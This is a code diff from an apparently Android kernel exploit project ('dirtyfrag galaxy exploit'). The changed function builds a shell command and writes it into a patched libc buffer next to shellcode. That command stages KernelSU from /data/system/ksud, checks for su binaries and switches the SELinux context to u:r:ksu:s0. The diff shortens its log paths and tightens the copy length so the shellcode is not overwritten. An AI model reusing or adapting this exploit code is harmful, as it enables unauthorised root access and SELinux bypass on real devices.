@@ -624,20 +624,20 @@ Java_dirtyfrag_galaxy_exploit_ExploitNative_nativeRunAll(JNIEnv *env, jclass clz
                         // This file is only a diagnostic in /data/local/tmp; it is
                         // removed at the beginning of each run.
                         snprintf(cmd, sizeof(cmd),
-                                 "rm -f /data/local/tmp/df-k.log; "
                                  "/system/bin/logcat late-load "
                                  "--package-name %s --bootstrap-uid %d "
                                  "--stage-from /data/system/ksud --ro-partitions "
-                                 ">/data/local/tmp/df-k.log 2>&1 & sleep 12; "
-                                 "echo post-check: >> /data/local/tmp/df-k.log; "
+                                 ">/data/local/tmp/d 2>&1 & sleep 12; "
                                  "ls -l /data/adb/ksud /system/bin/su "
-                                 ">> /data/local/tmp/df-k.log 2>&1; "
+                                 ">>/data/local/tmp/d 2>&1; "
                                  "grep -i kernelsu /proc/modules "
-                                 ">> /data/local/tmp/df-k.log 2>&1; "
+                                 ">>/data/local/tmp/d 2>&1; "
                                  "echo u:r:ksu:s0 > /proc/self/attr/current", pkg,
                                  (int)bootstrapUid);
                         size_t n = strlen(cmd) + 1;
-                        if (n > 480) n = 480;
+                        // cmd_buf is followed by the soft-reboot byte in libc.S;
+                        // never let a long package name overwrite shellcode data.
+                        if (n > 320) n = 320;
                         memcpy(libc_data + libc_cmd_buf_off, cmd, n);
                         REPORTLN("late-load manager pkg: %s", pkg);
                     }
